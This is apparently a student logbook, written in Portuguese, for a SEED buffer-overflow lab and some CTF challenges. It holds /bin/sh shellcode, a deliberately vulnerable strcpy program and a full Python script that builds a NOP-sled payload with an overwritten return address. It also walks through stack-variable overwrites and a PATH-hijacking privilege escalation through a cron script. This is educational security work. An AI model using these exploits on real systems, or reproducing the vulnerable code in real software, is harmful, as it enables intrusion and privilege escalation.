# Logbook 5

## Task 1

```
xor  rdx, rdx        ; rdx = 0: execve()’s 3rd argument
push rdx
mov  rax, ’/bin//sh’ ; the command we want to run
push rax
mov  rdi, rsp
push rdx
push rdi
mov  rsi, rsp
;
; rdi --> "/bin//sh": execve()’s 1st argument
; argv[1] = 0
; argv[0] --> "/bin//sh"
; rsi --> argv[]: execve()’s 2nd argument
xor  rax, rax
mov  al,  0x3b       ; execve()’s system call number
syscall
```

O código em C gerado a partir do código shell mostrado acima, é o seguinte:

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;
int main(int argc, char **argv){
   char code[500];
   strcpy(code, shellcode); // Copy the shellcode to the stack
   int (*func)() = (int(*)())code;
   func();                 // Invoke the shellcode from the stack
   return 1;
}
```
O código acima contém duas cópias do código shell.  Quando compilamos o programa utilizando a flag -m32, é usada a versão de 32-bit, enquanto que sem a flag, é usada a versão de 64-bit. 

Utilizando o ficheiro Makefile presente no diretório do logbook, compilamos o código com make. Foram criados dois ficheiros binários, um a32.out e um a64.out. A compilação usa a opção execstack, que permite que o código seja executado a partir da stack, mas sem esta opção o programa falha.

__1) Correr o ficheiro a32.out__
![](https://i.imgur.com/gS1eS11.png)

__2) Correr o ficheiro a64.out__
![](https://i.imgur.com/OYuyqnY.png)

#### Conclusões
O resultado da execução de ambos os ficheiros é o mesmo.

## Task 2

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
 * won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif
int bof(char *str){
    char buffer[BUF_SIZE];
    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1; 
}
int main(int argc, char **argv){
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

#### Results in terminal:
![](https://i.imgur.com/cEGRMtf.jpg)


#### Conclusões

Existem 4 executáveis com configurações ligeiramente diferentes, possuindo valores diferentes em DBUF_SIZE.
Utilizamos a stack-L1.

## Task 3

Para explorar a vulnerabilidade de *buffer overflow* no programa de destino, a coisa mais importante a saber é a distância entre a posição inicial do buffer e o local onde o endereço de retorno está armazenado. Utilizamos um método de *debugging* descrito no tutorial SEEDS, e encontramos o endereço do *frame pointer* e do *buffer*



![](https://i.imgur.com/jt5G3R6.jpg)

Utilizamos o seguinte código para o ataque:

```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) - 1
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc9dc + start 
offset = 0xffffca48 + 4 - 0xffffc9dc

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)

```

O objetivo é colocar o nosso *shellcode* numa região acima do *return address* e alterá-lo para apontar para esse local.

![](https://i.imgur.com/mr1uds2.png)

---

# CTF

## Semana 5 - Desafio 1

scanf("%28s", &buffer); -> lê 32 caractéres para o buffer
char buffer[20]; -> o buffer foi declarado com 20 bytes
Encontrámos assim uma vulnerabilidade comum, o buffer overflow.

char meme_file[8] = "mem.txt\0"; -> diretamente a seguir a buffer na stack está alocado meme_file, com 8 bytes

FILE *fd = fopen(meme_file,"r"); -> precisamos que meme_file seja "flag.txt\0"

Usando pwntools, no scanf, enviámos um caracter arbitrário 20 vezes, seguido de "flag.txt\n".

## Semana 5 - Desafio 2

Segue-se o mesmo princípio que no desafio 1, simplesmente temos de também reescrever val com o valor correto para passar o check.

scanf("%32s", &buffer); -> lê 32 caractéres para o buffer
char buffer[20]; -> o buffer foi declarado com 20 bytes
Buffer overflow novamente.

char val[4] = "\xef\xbe\xad\xde"; -> diretamente a seguir a buffer na stack está alocado val, com 4 bytes
char meme_file[8] = "mem.txt\0"; -> e diretamente a seguir a val está alocado meme_file, com 8 bytes

if(*(int*)val == 0xfefc2223) -> precisamos que este check seja true
FILE *fd = fopen(meme_file,"r"); -> e precisamos que meme_file seja "flag.txt\0"

Usando pwntools, no scanf, enviámos um caracter arbitrário 20 vezes, seguido de 4 bytes com o endereço 0xfefc2223, seguido de "flag.txt\n".
Importante notar que o endereço tem de ser enviado na ordem "\x23\x22\xfc\xfe", já que a máquina é little endian.

## British Punctuality

-Passo 1, ler conteúdo dos ficheiros em ~/
Lendo ~/main.c, apercebemo-nos que a flag está provavelmente em /flags/flag.txt
~/my_script.sh primeiro faz source das PATH variables em /tmp/env, e corre printenv sem path absoluto, algo que podemos atacar se o script for corrido por algum utilizador com permissões necessárias.

-Passo 2, explorar ficheiros a que temos acesso
Encontrámos um ficheiro, /tmp/last_log, que aparentava ser o output de ~my_script.sh corrido com permissões necessárias para aceder à flag.
Encontrámos também /etc/cron.d/my_cron_script, que corre a cada minuto, e lendo o seu conteúdo apercebemo-nos que é exatamente o script que produz /tmp/last_log a cada minuto.

-Passo 3, criar um executável com o código maligno
Verificámos que podemos escrever em /tmp/, portanto criámos um ficheiro /tmp/hackerman.c com o comando system("cat /flags/flag.txt");
Compilámos esse ficheiro como /tmp/printenv

-Passo 4, mudar as variáveis de ambiente
Escrevemos um /tmp/env com "PATH=/tmp:&PATH", algo que será sourced por ~/my_script.sh

-????

-PROFIT!!!
